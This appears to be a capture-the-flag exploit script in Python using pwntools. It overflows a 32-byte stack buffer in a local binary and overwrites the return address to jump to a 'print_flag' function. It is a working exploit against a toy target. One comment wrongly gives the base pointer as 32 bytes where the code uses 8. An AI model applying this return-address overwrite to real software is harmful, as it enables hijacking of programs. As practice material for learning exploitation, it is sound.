#So in this case we have a function named print_flag, we need to execute it.
#By analysing the program we notice that there is NO padding/alignement
#in memory by the compiler (see findPadding.txt), so we can apply overflow easily

#So we can fill the buffer variable(32 bytes), the base pointer (32 bytes)
#and then we can get the function address where we need to jump, by searching
#it with the elf library, and the we add it to the message to be sent.

from pwn import *

elf = ELF("./hi")
address = p64(elf.symbols['print_flag'])
#print ("This binary has many symbols:")
#print (address)

msg = b'a'*32 + b'a'*8 + address

p = process("./hi")

p.sendline(msg)
#print(p.stdout())
p.interactive()
#print (p.recvall())
